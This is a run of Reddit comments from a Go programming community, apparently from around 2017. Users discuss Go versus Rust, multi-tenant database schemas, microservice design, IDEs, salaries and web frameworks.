I was limiting myself to abuse of interfaces, but here are a few others we've run into that would have been avoided with Rust: * assuming that `map` is thread safe (wrong assumption, but Rust protects against this); we now have mutexes everywhere and likely missed a few spots * the lack of generics has resulted in code duplication, and now we have some blocks of very similar, but not quite the same code in different​ parts of our application * we've had issues embedding C libraries into Go, specifically Lua, that use signals to communicate exceptions and mess with Go's GC; we ended up moving that code out of our main Go code and use sockets instead, but this kind of defeats the purpose of using a scripting language; we've had similar problems (not related to signals, but use of C libraries in Go) with SQLite and are now avoiding C libraries as a matter of policy * it's not obvious when we're incorrectly using memory, especially for relative novices A lot of these are misreading documentation, but we have run into them and Rust would likely have prevented them. Go is so simple that it's easy to miss the subtleties. Now, I love writing Go code, but if Rust had been stable at the time we needed to make a decision about our product, we probably would have gone with Rust. However, I don't regret our decision to use Go, but we do run into preventable problems from time to time with new programmers. Go is a fantastic language, and I'd love to see a 2.0 release at some point in the future to resolve some annoying issues (not necessarily the above). &gt; I hate to state the obvious here, but — don't do that :) We now do code reviews for every change to prevent problems like these from ever happening again. I am the most veteran in our team (been writing Go code since just before 1.0, I transitioned our product at 1.0's launch), and the rest is about 50% "veteran" (at least 1 year of production Go code) and 50% rookies who learned Go for the job.
It's about using the right tool for the job. `Iterators` are one of the biggest strengths of functional programming. They are simple to design, and doing it this way eliminates the need to perform any memory allocations. It is merely a list of routines to apply when values are later requested. One would normally simplify it like so in production Rust: for email in users.iter_mut().filter_map(get_gmail_address) { println!("{}"); } Where `get_gmail_address` is a function that contains the imperative code previously written as a closure. Things really start to shine when you perform more complicated actions, such as creating another iterator and either chaining or zipping the two iterators together -- still without performing any allocation. None of this is practical to pull off with the imperative paradigm alone. let gmail_users = users.iter().filter(get_gmail_users()); let yahoo_users = users.iter().filter(get_yahoo_users()); for user in gmail_users.chain(yahoo_users) { println!("{}"); } And you may even reuse an iterator in multiple levels of a while loop to refine your searches and eliminate conditional expression overhead. while let Some(value) = iterator.next() { if this is true { while let Some(value) = iterator.next() { // check for and collect values for this domain } } else if ... ... }
Also this is a based on gin backend web framework.
I guess the question is, once you specified a schema name when you initialized your connection pool, how do you change it for a specific connection of that pool when a customer request something? Edit: schema, not database 
Sry for the inconvenience.
I was thinking on keeping a Global Schema, where I would have table to which I would add an entry per schema. Maybe the auth could be in the global state, or maybe a per domain log in. The point is, say I get a new customer, with a CLI I'm just starting I would add an entry to my customer table in the global schema, and also I would create a new schema. What do you think?
&gt; The standard way of tearing things down in Go now is via a Context, Hmm, no, I don't think so. Contexts provide a way to give cancelation semantics to call trees. They're not a general way to control entity lifecycles.
Exactly! A big goal of the project is to allow service discovery with minimal setup. Using IPv6 Multicast we can achieve membership without knowing any information of the other instances. The trade off being your network must support multicast. Currently, Stela is only meant for on-premises, or edge type use. I'm working on changing its membership package (https://github.com/forestgiant/disco) to allow for the option to scale without multicast.
Interesting. How do you consider an "entity lifecycle" to be different from a "call tree"?
No issues, if you want any help, ping me I am thewhitetulip on github, sapatil@live.com is my email
we don't. in pg (and other databases) you can just write: `select * from schema.table where ...` `update schema.table set foo = bar ...` for tenant-specific information. If we need to do something fancy or weird we can always create a new connection, but we haven't needed that so far.
Yeah, we have a master table with all the tenant "domains" (i.e., the schema names) and create a new schema with a dedicated DB connection that has the necessary permissions to create a schema. Then whenever we construct SQL queries that need tenant-specific information, we just qualify all the table names. So, `select * from schema.table where ...` We store sessions on the backend, so when somebody signs in their "domain" is stored in the session and we just extract it for each SQL query we construct.
I love how completely perfect relevant this talk is to the question, great link!
If a cancelable call tree continuing to proceed is dependent on the existence of some entity the calls have passed through, then "entity lifeycle" vs. "call tree" becomes (again) a distinction without a difference. (IMO whether or not it's a "standard" isn't really the point here)
Thanks, then I'm on the right track. Not using sessions, I have an JWT implementation, but I rather not put the schemas name on the payload, just to keep my mind at ease. Maybe I could put it at context level. We'll see.
don't even get me started about JWT. :-) https://twitter.com/CiPHPerCoder/status/841539451545407488 https://twitter.com/tqbf/status/841407679016927233 http://cryto.net/~joepie91/blog/2016/06/13/stop-using-jwt-for-sessions/ 
Damn /u/sbinet you HEP guys have all the fun shit
[Just for Func](https://www.youtube.com/channel/UC_BzFbxG2za3bp5NRRRXJSw) is a pretty solid intro.
How big does the compiles JS get? When I was experimenting with GopherJS a while back, I got reasonable sized JS files when I was using gopherjs-vue... however as soon as I started using html/template on the frontend, the output JS file exploded in file size making it impractical.
Simple, but I liked it. Simple things that you may consider (these are not feature requests, just ideas if you want to improve it =)): - Use [MarshalIndent](https://golang.org/pkg/encoding/json/#MarshalIndent) instead of Marshal for a more readable reminders.json. Or even use another format like [YAML](https://github.com/go-yaml/yaml) - Store time in [Unix format](https://golang.org/pkg/time/#Time.Unix). In this case you should convert to user timezone on show, because by default it will be converted to UTC - On Windows it works fine on Git Bash, but it's shadowed on CMD because `REM` is a native CMD command. Unfortunaly, the only solution for this would be rename it
Now, Js just do some simplification, will be more complicated to deal with later. 
I assume you meant minification? By my experience, as soon as you start using html/template with GopherJS your output JS becomes multiple megabytes in size vs just kilobytes if you use gopherjs-vue for example. Not trying to be rude sorry, but these are harsh realities I discovered while I was trying to do the same thing a while back.. trying to make an isomorphic web app in pure Go and share html/template on both back and frontend.
Now, did not compile go into Js, but only simplified Js wording.
You can always contribute, I will be more than happy to accept improvements. I was doing this project for myself because of constantly using terminal and forgetting stuff, later thought of publishing if anyone has the same problem. Shoot, should've done my research about the command (thank you, first project). Will rename it. Thanks for the feedback.
I don't think a niche use case justifies slowing down integer math for all the common cases.
The nice thing is that you can grep for .expect and .unwrap very easily.
I don't understand why people who complain here don't use Rust instead of Go. It's so simple.
Nice to see a bank designing technology properly from scratch and avoiding all the legacy stuff. Assume they keep security up front this is gold. May have to see if they are hiring...
Since you are comparing Go to Node, I should put a little effort into the JS snippets. Eg. // Javascript - return multiple values function foo() { return [1, 2]; } var [a,b] = foo(); can be written way better in ES6 function foo() { return {a: 1, b: 2}; } const { a, b } = foo(); You now have *a* and *b* as variables. That is how you can easily multiple return values in JS. Syntax is almost the same as in node. Mechanics behind are different though.
Thanks for the feedback :) I'll make an edit
Just FYI, the examples are actually including Go's compilation time in the benchmarks, by way of using "go run". And it still wins. :)
Ha it's pretty incredible.
I started learning by using the Cobra library to build a little CLI tool. They make it super easy to get up and running. https://github.com/spf13/cobra
Ah I was actually just looking at that because I accidentally botched the python earlier. I'm going to update the gist and results tomorrow. Thank you :) Never messed with ocaml but the syntax is pretty sleek and that speed is super impressive. Cool stuff.
For Go code, you should use the bufio package for reading and writing files. By default Go doesn't buffer the IO operations.
In a way that's fair, 'cuz Javascript is JITed. :)
 &gt; if item.League == "Legacy" &amp;&amp; item.Type == "Breach Leaguestone" &amp;&amp; item.ItemLevel &gt;= 69 { item.Type == "Breach Leaguestone" is your problem here, that requires an exact match for item.Type. You will need to change that to be a lazier match type.
&gt; This isn't true. Rust is about providing the best tool for each task. That means embracing a functional paradigm when designing iterators as that is what functional programming does best, and using imperative programming elsewhere where the imperative paradigm works best, and using pattern matching for error-handling and describing states. So do C++ and Perl. The problem is that not everyone shares the same taste of abstractions. Different people would choose different feature sets subjectively. For example, there are disagreements about the use of the advanced template meta-programming techniques in C++. Go values idiomatic way without too much room of personal (aesthetic) judgements. When it's really needed to deviate for, say performance reasons, there are benchmark numbers to back it up objectively. &gt;This is a big problem because more LOC means a higher incidence rate of bugs. It's one of the reasons that iterators in Rust are so powerful and failure-proof. LOC is a helpful metric for comparison when we take the logarithm of it. Otherwise, there are better metrics like the Cyclomatic complexity. &gt;Not sure what you mean by this. Rust has no issues with external tools, but Rust does provide best-in-class tools for a large number of needs, and Cargo is extensible with a public API so that the community can develop their own cargo subcommands. The RLS is still struggling to be full-featured with the complexities of Rust. And I don't expect it can achieve the standard of UX as Go provides, considering that it has to be a background daemon and has to build indexes or metadata prior to working. Btw, I didn't downvote you for our disagreements in case that matters.
Nice article of John Stamatakos, a new Go Developer from Greece, we're multiply over the years!
It really depends as to what you are planning to learn, writing cli apps/webapp/ML/AI etc I would recommend taking a look around what tools you require and aren't existing yet. For instance, I use an android phone with termux terminal, and I wanted a good todo list manager which'll sync up with my machine, so I wrote one in Go, I use the cli in termux which then syncs with syncthing. Thus, I have a small app which I use in day to day life. I also wrote a todo list manager (https://github.com/thewhitetulip/Tasks) when I was learning webdev, then I wrote this (https://github.com/thewhitetulip/Tasks-vue) when I was learning the VueJS. The key is to build something _you_ use, and if it is really a timesaver, then you can show it to others and they'd use it too. I wrote a small guide , https://github.com/thewhitetulip/web-dev-golang-anti-textbook/, it aims to teach how to write webapps to total newcomers to web development. There is a quote attributed to Einstein, "you haven't really understood a topic until you can explain it to your grandmother", what I learned in my journey is that you'll learn faster if you teach others. All the best!
If you hate coding, why are you doing it? Is this perhaps a homework assignment? ;-) Your description is still quite vague. Where do you want to place the code snippet into main? What syntax error message do you get? 
statistics please. If you ran the benchmarks then you should have the numbers. Googlers take the cake when it comes to taking liberty. FYI, your entire test suit is micro-benchmarks.
The concrete evidence is the comments made by /u/dgryski. You could easily evaluate those comment by clicking the link to /u/dgriski that I have now posted three times- once should have been enough(and without further explanation).
There are plenty of things that many people using Go 1 agree would be useful to add, but won't be because of the compatibility guarantee. Go 2 isn't going to be a way to add features people disagree about adding to Go 1. It's going to be a way to add features that *can't* be added to Go 1. Considering the fast rate of adoption of new Go 1.X versions, I imagine that once Go 2 is release most Go 1 users will adopt it almost as quickly except for software which will not compile on Go 2 where migrating it isn't worth the effort (legacy, rarely-used, soon-to-be-rewritten, etc).
&gt; Didn't read after that Never want to see or hear your opinion after that.
In my experience you want to have a schema per customer and a mapping of the schemas on the database servers (which schema lives where?) and store that mapping (and the connection strings) in the shared data. Then you want to either replicate the shared data (in its own schema) to all database servers or make a separate connection for your shared data. That is what I would do if I need to scale and secure the system.
It's open to everybody :) (And there will be another challenge for nips 2017, if I am not mistaken...)
&gt; that functionality could be reduced to `defer someMu.Lock().Unlock()` Please No! Do you think this is clearer? What is defered? Locking *and* Unlocking or just Unlocking? It probably is Unlocking but it's _not_ what written on the screen: Your reduction reads "defer locking and unlocking someMu until done with current function". You reduction might be formally correct but it is the opposite of clear. Safing lines is not a goal per se.
I came here to say this ^ ^ ^ ^ ^ ^
Next step is breaking it up into microservices and load balancing it ^^^/s
&gt; line-by-line IMO it's not a good idea to translate programs this way. You end up with a Python program shoe-horned into Go instead of a Go program. Different languages have different idioms and ways of doing things and ideally you should translate between those idioms which is a much higher level than "line-by-line".
This is not exactly representative because of their survey method. Keep in mind, that most of the "well-established" languages like C#/Java/Python/C/Ruby/C++ has a very big salary dispersion because they are used anywhere from your "Hello World!" or CRUD program to a highly critical and/or extremely complex applications. The problem with this approach is that your "average" Haskell or Clojure developer will earn more in those kinds of surveys mainly because there are simply fewer of them in comparison to developers who code in more established languages. It's all about "good, old" average. IMHO, I don't like the survey 'by technology' because from my experience people salaries are in direct correlation to amount of responsibility that is placed on them. Language/Storages/Ecosystem is simply a tool to achieve business goals.
If you are beginning as a web developer, then you should probably choose Ruby. Ruby/Rails ecosystem is more beginner friendly than Go ecosystem. The most of Go developers are experienced programmers who learned programming from other languages' ecosystem and then switched to Go. A beginner programmer should focus more on productivity than the scalability of the language itself. With Ruby, you may not hit the ceiling of performance at all. If you really do, only then you should look for a faster alternative (Go, Rust, Elixir etc).
That makes a lot of sense. I suppose the only thing I don't like about Ruby/Rails so far is its monolithic nature. But yes, I should probably stick with Ruby/Rails and once I get my feet off the ground start taking on small projects in Go. Thanks for your response!
Thanks, that's golden, I was only thinking about checking the i side, not both. 
Speed is definitely a plus with Rails. However I realllllly like the micro-service approach that Go promotes. I would love to see some Go projects that have implemented things like authentication and a front-end framework like React or Vue. 
There's no need to start with the micro-service approach right from the beginning. In my opinion you should start with a monolith and if necessary slowly extract important services as micro services. Besides, if you structure your code appropriately and separate it to service structs and interfaces, pick good package names etc. if you decide to extract one of those into a separate service later down the line, the process should be quite easy. &gt; I would love to see some Go projects that have implemented things like authentication You'll need lots of research, read lots of code and dig into many articles to find those. You'll have to make many decisions yourself, write boilerplate, tryout libraries etc. Meanwhile most if not all those are already made for you in the Rails world.
Microservices are misunderstood because lots of folks talk about it like it's the pattern of patterns. They're not. Microservices come with a buuuunch of new problems that need solving that weren't problems in monolithic architectures. Things you took for granted e.g. logging get complex when using microservices. You've just started programming and microservices are the big buzz word right now but don't fall into the trap of designing your app in microservices from the beginning or else you'll be overengineering it. Microservices do have a big advantage over monoliths but only if you felt the disadvantages of a monolith. Lets say you're starting to work on a project and you 'feel' it could have potential to get big. Even then I'd suggest pushing out a monolith first as it's better to get out fast and get user feedback then to over engineer the architecture, something the user is completely unaware of. Some people may disagree but when it comes to scaling in 99% of the time I'd suggest to: 1. start with a monolith * if you gain users and performance gets worse then 2. start caching everything you can * if you gain users and performance gets worse then 3. start multiple instances of your monolith behind a load balancer * start clustering your dbs * if you gain users and performance gets worse or it gets to expensive to justify running all the monolith instances then 4. start breaking up your monolith into microservices I know the feeling of wanting to get it right the first time but it really isn't worth the effort. You'll make architectural mistakes writing your app regardless even if you're using the microservices pattern from the start. To answer your qustion about how complicated it is to attach front-end libraries such as vue or react I'd say it isn't. **BUT** like I said microservices come with a bunch of new problems to solve and one of the new problems is where does you UI come from? Your UI now consists of multiple services so you have to have one service dedicated to assembling your UI. What has been one request to one endpoint now is a request to n endpoints and you need to think about what it means for your app when one of those calls fail. Then you start debugging and because all of those calls are async you can no longer read the look from top to bottom. You'll need request tracking in you're logs and some sort of context shared between you services etc etc etc. tl;dr: Microservices are ONE solution to a problem not THE solution to web development 
Is it really that bad? Would love some more info on this.
As a German I find the name very funny.
Thanks so much! Really appreciate the help. I really do need to get around to finishing the tour - I just had an idea halfway through and decided to get building but I should take the time to finish it. Yeah I've used languages like Java, C#, C++ and PHP in the past but I've been a JavaScript &amp; Node developer for the past 2/3 years so I'm not used to it yet.
my imports are import ( "encoding/json" "io/ioutil" "log" "net/http" "os" "os/signal" "github.com/ccbrown/poe-go/api" )
One line returns look great :) Though I'm not sure if I'm not too used to seeing ``` if err != nil { return errors.Wrap(err,"asdasd") } ```
Thanks. This was very instructive. Why was it done ? Is git status using this algorithm ?
If you build stuff in Go it's easier to share. People have generally an easier time using your software. Maybe that's also important for you?
You can also use sort.SliceStable to combine several sort criteria https://play.golang.org/p/qeJhbexl33
Sure, keep learning go but also try other languages too. Programming languages are just tools. Learning a couple different ones will help you in a future job search. Once you know a few you can pick up any others quickly when you need to. 
Thanks! Any specific languages you'd recommend? I'm learning Java and am proficient in js.
&gt; Why was it done ? &gt; The comparison of trees is one of the core parts of https://github.com/src-d/go-git, we were working on this during a few months, to be at the level of libgit2 or cgit. You can find the why of go-git at https://blog.sourced.tech/post/our-roadmap/ 
anyone have an recent use comparisons against vscode? I used to do a lot of JS in webstorm, switched to vscode for typescript and go. Any completion/debugging/performance advantages over vscode. The go-plugin has felt reasonably complete so far.
Cost of living sucks, but it's not really a hassle. Except having to avoid the traffic of 40,000 Uber/Lyft drivers circling around SF, stopping in the middle of traffic to drop off/pickup all day, avoiding human excrement on the sidewalks, lines out of every restaurant, and every other person being a techie thinking they're saving their world with their app... sigh... I guess I'm just afraid to give up my rent controlled apartment.
Try this, I'm pretty sure I remember it working for me on windows when nothing else would http://tdm-gcc.tdragon.net/
Does it support go html templates yet?
Trying to lol.
glad it helped. I can't tell you how many hours of frustration I went through before finding it mentioned in some obscure forum. I agree it should be at least cited somewhere. Everyone always links to mingw and I've never gotten it to work.
You can vote on this issue https://youtrack.jetbrains.com/issue/GO-2953 to let the devs know that this is important for you / others. They are very active and will definitely see it.
machma oda machma ned
FYI, you can write init() multiple. https://play.golang.org/p/ERlqLxKz8c 
Cool, thanks for all the advice.
https://play.golang.org/p/ThqpRp3IGT sort.Slice(data, func(i, j int) bool { return data[i].Value &lt; data[j].Value || (data[j].Value == -1) });
Go is a language in growth - so where in areas it do have good adoption - both in terms of geography and field of use - demand outstrip supply. Which probably can be interpreted as Bay Area USA and large scale backend/infrastructure. For the rest of us, the bright side is that Go is way up there in the Wanted Languages. On the not so bright side, Go isn't even on the map with regards to professional use here in Europe where I live. Not yet anyways. Which is a bit of a downer. Now, where is my Green-Card lottery ticket?! :P
I recall installing MinGW-W64 GCC-6.3.0, x86_64-posix-seh from https://sourceforge.net/projects/mingw-w64/files/ and it seemed to work fine.
That is really quite clever. How hard is it to set up gelphi to do the visualisation? 
If you decide to let me know. I don't live there or work there. But I might if I could get a rent controlled apartment Hahaha 
That is if the demands are the same. What if there are more demand for "Pythonistas"?
I like the analytical approach to discovering what to test. I wonder if you could use pprof to weigh functions by how frequently your actual system uses them. Or weigh functions by complexity: like cyclomatic or LoC.
I basically was inspired by pprof (and an existential panic when the time to produce the product was up and I had an untested product).
I work for another company, not in the Bay Area, but the headquarters are there (Fortune 500) and I just got hired, with a wage around the amount mentioned there. Can confirm. 
If you think VSCode is enough for you then it certainly is. Gogland does not add anything mandatory. Though the features are quite helpful. Specifically the test runner and the fact that the auto-completion is not based on gocode. It is really intelligent compared to VSCode, Atom, Sublime and Vim (which all use gocode).
So you can't have a constructor for your whole package which is sorta what you're asking for. I can't be sure without looking at the code, but it sounds like you should make all your functions into methods on a struct so that you can have a constructor. For example. Lets imagine you have a "github.com/foobar/foo" package. Inside it, make a Foo type with a constructor like type Foo struct{ ... } func New(r io.reader) Foo { ... } And then clients will use your library like import ( "os" "github.com/foobar/foo" ) f, err := os.Open("foo.txt") check(err) myFoo := foo.New(f) myFoo.SomeFunc() tl,dr; change your code to require struct initialisation instead of package initialisation. 
Cool, good to know. I wasn't able to make your example work, but I figure it's something I missed as I'm very new to the Android dev environment. I took a detour building my project in Termux's Go package and running it from command line, but now (well, next) I'm ready to try again making it an app. ~~From your errors I'd take wild (and low-confidence) guesses that maybe you need JDK and have JRE for the float one and perhaps the "sources;android-xx" package from Android SDK for webkit.~~ (edit: pretty sure I'm wrong on these after reading your question on GitHub...I was thinking the Java side, but you're missing the Go defs/refs for these.) Back to gowebview, this is the error I got when trying to run the example. I only have the android-25 package which was ID 1 in my list. I found the line where the "Error: null" is likely happening but went off to do other things before figuring out why. I'm not sure if I'm supposed to build from the repo root or example, but I get the same error either way. If you happen to go "oh yeah, thats..." then let me know, but don't spend any time looking into this: gowebview -target 1 C:\tools\AndroidSDK\tools\android.bat create project --name main --package com.github.microo8.gowebview.build --activity Main --target 1 --gradle --gradle-version 2.2.3 --path ./build Created project directory: C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build Created directory C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\main\java Created directory C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\main\java\com\github\microo8\gowebview\build Added file C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\main\java\com\github\microo8\gowebview\build\Main.java Created directory C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\androidTest\java Created directory C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\androidTest\java\com\github\microo8\gowebview\build Added file C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\androidTest\java\com\github\microo8\gowebview\build\MainTest.java Created directory C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\main\res Created directory C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\main\res\values Added file C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\main\res\values\strings.xml Created directory C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\main\res\layout Added file C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\main\res\layout\main.xml Created directory C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\main\res\drawable-xhdpi Created directory C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\main\res\drawable-hdpi Created directory C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\main\res\drawable-mdpi Created directory C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\main\res\drawable-ldpi Added file C:\Users\Jim.AD\Documents\go\src\github.com\microo8\gowebview\build\src\main\AndroidManifest.xml Error: null 2017/03/23 00:05:46 unable to read build\build.gradle: open build\build.gradle: The system cannot find the file specified.
I am not totally sure as to what you mean by Go usage in cryptography, what is it that you exactly want to do. Please forgive my naivety, I have not worked in cryptography. What is it that you want to build? Do you want to break crypto algo or do you want to build them? Make sure you read https://awesome-go.com it has the largest collection of libraries. Do let me know if you need any other help :)
It must be executed from the `example` dir. I didn't test it on windows, but the `android.bat create project ...` is supposed to create the `build.gradle` file. Don't know what is the `Error: null` output, try to find out what is it and also why `android.bat` didn't create the `build.gradle` file. Try to run the `C:\tools\AndroidSDK\tools\android.bat create project --name main --package com.github.microo8.gowebview.build --activity Main --target 1 --gradle --gradle-version 2.2.3 --path ./build` command (and its variations) your own. Don't know if this helps, but this would I do :) to the github question: it is entirely build by the gradle script, and it calls the [gobind gradle plugin](https://plugins.gradle.org/plugin/org.golang.mobile.bind) in the process. So where in `build.gradle` I can define these ` "sources;android-xx"` packages?
I'd recommend starting with Erlang though. While it's functional, it's way more smple to approach (than Scala, Haskell and other languages in the ML family) to mere mortals with imperative backgrounds. While it has the most crucial functional stuff implemented — pattern matching (with decomposing) and the idea that running a program is evaluating of an expression — it won't blow over your head with hardcore type theories and other "math stuff". "Programming Erlang" by J. Armstrong is a very gently put introduction.
We weren't talking about web development specifically but rather about training your brain by learning new paradigms. I'd heartily recommend you to not *fixate* on web development. Sure, these days, web development is what any newfangled or wannabe programmer most probably has their first encounter with but that's merely due to the *volume* of development being done, not because it's particularly interesting, hard or whatnot. Well, OK, if you still want to look at this from web angle, there's [N2O](http://synrc.com/apps/n2o/), and other words to google are Nitrogen and Cowboy. Please note that Node.js is sort of a weird thing: it started life as a neat hack (the result of "Chrome has a good JS engine and a network stack; what if we rip it out to make a standalone thing?") but otherwise it doesn't implement anything interesting. Networked callback-based scripting existed for at least a decade before Node (Tcl, and, later, Python with its Twisted framework) but Node appeared in a "right" time when web programming has started booming, and the fact it can be programmed in JS (however crappy the language is) was attractive for frontend devs. ;-) I mean, there's not much particularly interesting in handling HTTP requests — almost any language has libraries / platforms to does that.
I'm still inclined to think you're exaggregating a little bit. On the one hand, from where I stand, it looks like most of what mere mortals spend their leisure time in are "apps", not web browsers. This might or might not actually transition to "pure web" (note that the Apple's motto one time was "there's the web for that", but it changed to "there's an app for that" pretty quickly). (And Chromebooks here in Russia are almost non-existing; I've yet to seen any, for instance.) The apps do indeed usually talk to ReSTful services using HTTP calls and websockets. But is this "web development"? I don't think so: on backends, this is just an aspect of network programming. What I'm leading to, is that quite a number of tasks performed outside of browsers are not web development even if the end result of what they do is being eventually piped to something connected over HTTP/websockets. Think about fault-tolerant distributed databases, transactions processing, video/audio streaming processing—to name just a few. …and then there is "plumbing layer"—the OS, and what actually powers all those ReSTful services. Don't just count this off; IMO the most interesting and hardcore tasks are there and not among fighting with `&lt;div&gt;` positioning and crunching JSON. Oh, well… ;-)
I'm not sure this is true. Isn't the convention to add the default bin directory to your path? export PATH=$PATH:$(go env GOPATH)/bin EDIT: src https://golang.org/doc/code.html
The title is explicitly supported by the data.
Go to implementation / go to interface is nice thing to have. I do miss the "lightweight'ness" of vscode tho. 
No named axis, no labels at all. I have no idea what color is which version of go.
&gt; `@GeorgeMacR` What is the unit of the Y axis? What do red dots represent? &gt; &gt; `@ngrilly` avg seconds of accumulated time in GC, red dots are the deployment. 1.7 before then, 1.8 after. &gt; &gt; `@GeorgeMacR` Seconds? Not ms? A GC pause of 20 seconds is colossal. Or do you mean it's "accumulated" since process start? &gt; &gt;` @ngrilly` accumulated since process start. I'm sure I could find a better metric to articulate this. So, "the accumulated GC pause time is way less with 1.8 than with 1.7" ;-)
Great course for learning go: https://www.udemy.com/learn-how-to-code/ Good course for learning webdev with go: https://www.udemy.com/go-programming-language/
https://www.gitbook.com/book/astaxie/build-web-application-with-golang/details https://github.com/alioygur/gocart
At it's core, a webapp takes an input (http request) and returns an http response. When it gets the http request, it takes a look at the token sent by the browser, if it is present, it logs the user in, if not, then it redirects the user to login page. if the user is authenticated, they are redirected to the home page '/'. '/' is the URL, we have a handler for each URL pattern. The handlers talk to the database and populate the html templates (which are written in Go's templating syntax). guide: https://github.com/thewhitetulip/web-dev-golang-anti-textbook/ REST API example of ecommerce: https://gitlab.com/thewhitetulip/shop-rest
I may be wrong but doesn't closing the io writer signals EOF?
Close the file descriptor. That signalizes EOF on the other end of the pipe.
Close the io.ReadWriter https://golang.org/pkg/os/exec/#Cmd.StdinPipe
You cannot have Go files directly in `$GOPATH`. All source files have to reside in some subdirectory of `$GOPATH/src/`. Usually you create a project directory there and put all your Go files into it. (You can use subdirectories.) More details [here](https://golang.org/doc/code.html#Workspaces). 
Yep. Was just hired by Amazon, got a 75k compensation jump. Base+bonus+RSU. I assume Google isn't far off.
There are a few places you could check other than job listings for local Go work. For example, you can check out the top Go developers in a location here: http://git-awards.com/users?utf8=%E2%9C%93&amp;type=city&amp;language=go&amp;city=San+francisco (for some reason this search is much better than doing the same advanced search at github.com itself). Or you can find a local Go meetup or other event. Basically click around and try to find out where the places that people who work in Go are (even if they don't list Go in a description specifically).
The post is extremely shallow. "The large amounts of data we send" -- who knows what scale they are referring to. I'm all +1 for language PR but at least have some meat to it. 
The link to trace/traceutil is relative, so it links to ``` https://rakyll.org/grpc-trace/godoc.org/cloud.google.com/go/trace/traceutil ``` instead of ``` https://godoc.org/cloud.google.com/go/trace/traceutil ```
&gt; Iris is our current favourite and in the future, we’ll re-write our servers to use it Definitely a bad idea. 
You've saved me from reading this. Thanks.
There are a lot of issues with this as a comparison. Especially with accumulated time... Was the load consistently the same across both deployments? A moving average or similar would tell a much better story.
Ah ok.
This will be a pretty non-standard proposition, but why not use bash on ubuntu on windows? The cgo stuff is much less cross-platform than the standard Go stuff and you're just going to be causing a lot of pain to yourself.
Very few real world quantities have fixed limits. Fixed range ints are the niche.
I know it's a very useful language especially for things like Machine Learning and what you said, I just strongly dislike writing it. Not to say that I don't recognize what it can do.
I've been using something similar to this for the past year or so, and it's been really useful. Extending it to the general case was quite tricky, but I'm happy with how it's turned out. While developing this, I also created https://github.com/dave/brenda in order to analyse the AST to isolate only errors that are tested != nil. I'm happy to answer any questions!
Here's the project I built brenda for: https://www.reddit.com/r/golang/comments/612seb/courtney_makes_your_code_coverage_more_meaningful/ 
Maybe it's because in the United States, it's what is actually cared about. Most of the top tech companies originate in the United States. People pay more for what they value.
suggestions: - drop email, since nearly any email address that has a '@' is valid. Don't use regex for emails. - don't use `MustCompile` each call—unnecessary overhead + it's not nice for libraries to have hidden panics. Instead, just make them all `*regexp.Regexp` since it's safe for concurrent use. 
Yep, you get paid less in London. Everyone in Europe wants to live there. Supply and demand.
Google it, but the tl;dr is that the Iris author steals intellectual property, isn't a pleasant to have a conversation with, and is generally antagonistic towards suggestions from the community. He creates sock puppets to promote his stuff and troll others. He deletes and edits github issues to try and obscure problems found with Iris. He's also really obsessed with github stars. 
I'm not saying that the debugging is on par with other languages but the profiler is well understood and documented imho.
Funnily enough I did settle on Atom. VSCode is superior to Atom and Idea is superior to them both no questions. Problem is that Atoms Vim mode is really really really good. Like I can't even describe how good it is. Also I really dislike the way the AceJump extension works. It is heavily slowing down if I have to type the actual character I want to jump to and after that its identifer. The Atom Jumpy just marks everything with a code instantly. Also Atom Jumpy works for all visible panes. So if you have 4 panes open and invoke Jumpy you can jump to any of them which is so incredibly useful. I know none of those is Go related but still. It made me stick to Atom although Atom itself clearly is worse than VSCode and specifically Intellij.
It is, for the time being, indeed a Gallium limitation.
regexes are bad for _validating_ emails, but they're not bad for picking emails out of blocks of text. There's a big difference between needing to confirm the validity of an email versus finding candidate substrings that may be emails. With that said, this isn't a reasonable method to _validate_ that a given input corresponds to a valid email address.
Yes I tried it out. But it is way worse than the Atom version honestly. It seems as if the Atom version has stuff like textobj baked in. Go ahead try out Atom vim with Golang and compare it to the IntelliJ setup. Also as said the fact that you have to actually type a char for the AceJump extension slows it down. And also in Atom you can jump from Pane to pane with the Jumper extension. This is not possible in IntelliJ. I am a student (and will be the next 3 years probably) so I will get the JetBrains product for free. I will always keep an eye out on the Go/Vim functionality since being able to use one single IDE for everything is wonderful (and Atom is terrible for use with stuff like Javascript, Python etc.) but in the current state it seems I will use IntelliJ for everything but Golang. As I said Atom is a terrible editor but the Vim and Jumpy extensions make it far more productive than any other editor/ide (at least regarding Golang, for me personally).
What about putting the -1 at the end to start with and calling sort.Sort(slice[0:len(slice)-1]) That won't move the -1 since it doesn't know about it.
If you use IntelliJ for everything but a certain language only then how are you using it for the other languages? Go is just provided like Python or Javascript so there's nothing special about it. Also, if you plan to use the IDE for a long period of time, try to use the keymap it has as pretty much everything can be done from shortcuts.
Ah I think it really depends. It's more likely to run into edge cases, so more effort needs to be put into the testing
I would argue that it being used more is an indicator that it's more *understood*. Usage patterns dictate impact, so if any change made in these high-impact areas would be breaking, it's very much worth it to set up tests in this area first to avoid this scenario.
Does the nginx example load *index.html* from disk on each request?
https://gowebexamples.github.io/
The profiler only take snapshots, not showing the development of ressources used over time which is ... subpar.
&gt; monitoring ~4.8k machines curious, what does your prometheus set up look like to monitor that many machines?
A project which includes a whole "browser engine" dependency, which runs HTML/JS/CSS code, which is supposed to be cross platform, which only runs on mac. This is madness!
&gt; Iris (our current favorite) I don't know if I should laugh or cry. Poor unfortunate souls. 
yep the only way to really know is to send an email to the address and ask the recipient if they received it.
